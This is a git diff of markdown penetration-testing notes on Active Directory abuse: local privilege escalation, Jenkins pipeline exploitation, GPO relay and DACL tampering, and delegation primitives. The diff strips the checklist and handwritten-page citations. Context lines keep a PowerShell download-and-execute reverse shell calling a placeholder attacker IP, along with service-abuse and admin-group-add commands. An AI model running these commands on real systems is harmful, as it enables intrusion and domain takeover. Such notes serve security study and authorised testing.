@@ -5,32 +5,6 @@
 
 ---
 
-## Table of Contents
-
-- [ACL, GPO & Delegation Abuse Checklist](#acl-gpo--delegation-abuse-checklist)
-- [Local Privilege Escalation (PowerUp / SCM Abuse)](#local-privilege-escalation-powerup--scm-abuse)
-- [Jenkins CI/CD Pipeline Exploitation](#jenkins-cicd-pipeline-exploitation)
-- [GPO Authentication Coercion & NTLM Relay Flow](#gpo-authentication-coercion--ntlm-relay-flow)
-- [GPO DACL Modification & Malicious Policy Injection](#gpo-dacl-modification--malicious-policy-injection)
-- [Permission Delegation Attacks & Abuse Primitives](#permission-delegation-attacks--abuse-primitives)
-
----
-
-## ACL, GPO & Delegation Abuse Checklist
-
-- [ ] **1. Local Privilege Escalation:** Execute PowerUp (`Invoke-AllChecks`) to find unquoted service paths and modifiable service binaries.
-- [ ] **2. Service Abuse:** Execute `Invoke-ServiceAbuse` to elevate local privileges to Administrator.
-- [ ] **3. Jenkins CI/CD Audit:** Check SRP/AppLocker rules and inject build task reverse shells.
-- [ ] **4. GPO DACL Verification:** Check write/DACL permissions over GPOs using `Get-DomainGPO` and BloodHound.
-- [ ] **5. GPO Coercion / Relay:** Place `.LNK` shortcut files or stage SMB path on target GPO shares for NTLM relaying.
-- [ ] **6. Permission Abuse Primitives:**
-  - [ ] **GenericAll / WriteDacl:** Grant full rights over target accounts or modify properties.
-  - [ ] **ForceChangePassword:** Reset user account password (`Set-ADAccountPassword -Reset`).
-  - [ ] **AddMembers:** Add controlled account into privileged groups (`Add-DomainGroupMember`).
-  - [ ] **WriteOwner:** Take ownership of target domain objects (`Set-DomainObjectOwner`).
-
----
-
 ## Local Privilege Escalation (PowerUp / SCM Abuse)
 
 When initial access is gained on a workstation or server, enumerate local privilege escalation vectors to obtain local `SYSTEM` or administrative rights.
@@ -46,7 +20,6 @@ Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Ve
 # Alternative automated local privilege escalation checker
 .\winPEASx64.exe
 ```
-> **Source:** handwritten p. 14.
 
 ---
 
@@ -66,7 +39,6 @@ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
 ```powershell
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444"
 ```
-> **Source:** handwritten pp. 17–18.
 
 ---
 
@@ -93,8 +65,6 @@ graph TD
 3. User or machine accounts process the link or GPO, sending NTLM authentication to `ntlmrelayx.py`.
 4. Relay authentication to LDAP or a target host to escalate rights.
 
-> **Source:** handwritten pp. 18–19.
-
 ---
 
 ## GPO DACL Modification & Malicious Policy Injection
@@ -108,11 +78,6 @@ write_gpo_dacl <USER> <GPO_NAME_OR_GUID>
 # Modify GPO remotely (gpowritty / GPO editing tools) to add user to local Administrators
 net localgroup administrators <USER> /add
 ```
-
-> [!WARNING]
-> **⚠ Verify from original:** Re-check exact `gpowritty.py` option spelling and SMB staging syntax on handwritten p. 19.
-
-> **Source:** handwritten pp. 19–20.
 
 ---
 
@@ -141,5 +106,3 @@ Set-ADUser -Identity 'svc_backup' -ChangePasswordAtLogon $false
 
 > [!TIP]
 > **BloodHound Integration:** Use BloodHound to visually graph delegation paths such as `AddSelf`, `WriteDacl`, `GenericAll`, and `Owns`.
-
-> **Source:** handwritten pp. 36–38.
